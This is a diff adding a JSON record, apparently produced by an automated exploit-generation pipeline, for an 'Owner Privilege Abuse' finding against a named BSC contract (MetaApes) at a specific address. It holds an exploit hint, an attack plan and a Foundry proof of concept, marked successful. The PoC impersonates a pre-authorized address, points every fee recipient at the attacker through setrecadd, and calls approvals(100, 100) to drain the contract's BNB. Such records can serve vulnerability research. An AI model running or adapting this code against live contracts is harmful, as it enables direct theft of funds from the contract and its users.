@@ -1,0 +1,61 @@
+{
+  "project_id": "MetaApes_0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70",
+  "target_address": "0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70",
+  "finding_id": 3,
+  "status": "SUCCESS",
+  "violation_target": {
+    "target_address": "0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70",
+    "vulnerability_type": "Owner Privilege Abuse",
+    "violation_category": "ECONOMIC",
+    "finding_id": 3,
+    "preconditions": [
+      {
+        "type": "role",
+        "description": "Attacker must be the contract owner or have authorized privileges",
+        "token_address": null,
+        "min_amount": null
+      },
+      {
+        "type": "token_balance",
+        "description": "Contract must hold BNB balance or token reserves",
+        "token_address": "NATIVE",
+        "min_amount": "0"
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": {
+        "target_token": "NATIVE",
+        "victim_contract": "0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70",
+        "condition": "attacker_balance_increased"
+      },
+      "logic_check": null
+    },
+    "exploit_hint": "As the contract owner or authorized address, call the cSb() function with a high percentage parameter (e.g., 100) to drain all BNB from the contract to the tfU (take fee utility) address, which is initially set to the deployer. Alternatively, use approvals() to distribute BNB to multiple fee addresses (krhF, mdhS, wthT, extR) which are also initially controlled by the deployer. The attacker can first ensure they control these recipient addresses via setrecadd() or similar functions."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\n// Interface for MetaApesBSC to call the functions\ninterface IMetaApesBSC {\n    function setrecadd(address _mkwa, address _krh, address _mdh, address _wth, address _ext, address _bbk, address _tfu) external;\n    function approvals(uint256 _na, uint256 _da) external;\n    function cSb(uint256 aP) external;\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70;\n    address attacker = address(this);\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No special setup needed for this exploit\n        // The contract is already deployed at TARGET\n        // We just need to impersonate the authorized address\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // Store initial balance\n        uint256 initialBalance = address(attacker).balance;\n        \n        // The pre-authorized address from Auth constructor\n        address authorizedAddress = 0x061648f51902321C353D193564b9C8C2F720557a;\n        \n        // Impersonate the authorized address\n        vm.startPrank(authorizedAddress);\n        \n        // First, set all recipient addresses to attacker address\n        IMetaApesBSC(TARGET).setrecadd(\n            address(attacker), // mkwA\n            address(attacker), // krhF\n            address(attacker), // mdhS\n            address(attacker), // wthT\n            address(attacker), // extR\n            address(attacker), // bbaK\n            address(attacker)  // tfU\n        );\n        \n        // Now drain the contract's BNB balance using approvals\n        // Use _na=100, _da=100 to send 100% of contract balance\n        IMetaApesBSC(TARGET).approvals(100, 100);\n        \n        vm.stopPrank();\n        \n        // Verify we received BNB\n        uint256 finalBalance = address(attacker).balance;\n        assertGt(finalBalance, initialBalance, \"Attacker BNB balance should increase\");\n    }\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "The MetaApesBSC contract has multiple owner privilege abuse vulnerabilities. Authorized addresses (including a pre-authorized address 0x061648f51902321C353D193564b9C8C2F720557a) can call functions that drain contract funds. The 'approvals' function allows transferring contract BNB balance to predefined addresses (krhF, mdhS, wthT, extR). The 'setrecadd' function allows changing these recipient addresses. By impersonating the authorized address, we can set all recipients to our address and drain the contract's BNB.",
+      "attack_strategy": "1. Impersonate the pre-authorized address 0x061648f51902321C353D193564b9C8C2F720557a. 2. Call setrecadd to set all recipient addresses to attacker address. 3. Call approvals to transfer contract BNB balance to ourselves. 4. Alternatively, use cSb function if contract has BNB balance.",
+      "step_by_step_plan": "1. Use vm.prank to impersonate the pre-authorized address 0x061648f51902321C353D193564b9C8C2F720557a. 2. Call setrecadd on the target contract with attacker address for all parameters. 3. Call approvals with parameters that maximize BNB transfer (e.g., _na=100, _da=100 to send 100% of balance). 4. Verify attacker's BNB balance increased.",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\n// Interface for MetaApesBSC to call the functions\ninterface IMetaApesBSC {\n    function setrecadd(address _mkwa, address _krh, address _mdh, address _wth, address _ext, address _bbk, address _tfu) external;\n    function approvals(uint256 _na, uint256 _da) external;\n    function cSb(uint256 aP) external;\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70;\n    address attacker = address(this);\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No special setup needed for this exploit\n        // The contract is already deployed at TARGET\n        // We just need to impersonate the authorized address\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // Store initial balance\n        uint256 initialBalance = address(attacker).balance;\n        \n        // The pre-authorized address from Auth constructor\n        address authorizedAddress = 0x061648f51902321C353D193564b9C8C2F720557a;\n        \n        // Impersonate the authorized address\n        vm.startPrank(authorizedAddress);\n        \n        // First, set all recipient addresses to attacker address\n        IMetaApesBSC(TARGET).setrecadd(\n            address(attacker), // mkwA\n            address(attacker), // krhF\n            address(attacker), // mdhS\n            address(attacker), // wthT\n            address(attacker), // extR\n            address(attacker), // bbaK\n            address(attacker)  // tfU\n        );\n        \n        // Now drain the contract's BNB balance using approvals\n        // Use _na=100, _da=100 to send 100% of contract balance\n        IMetaApesBSC(TARGET).approvals(100, 100);\n        \n        vm.stopPrank();\n        \n        // Verify we received BNB\n        uint256 finalBalance = address(attacker).balance;\n        assertGt(finalBalance, initialBalance, \"Attacker BNB balance should increase\");\n    }\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 0,
+      "error": null,
+      "feedback": null,
+      "duration_seconds": 94.67312216758728,
+      "prompt_tokens": 37536,
+      "completion_tokens": 1869,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 1,
+  "error_message": null,
+  "total_duration_seconds": 94.67671203613281,
+  "total_prompt_tokens": 37536,
+  "total_completion_tokens": 1869,
+  "total_cost": 0.0
+}
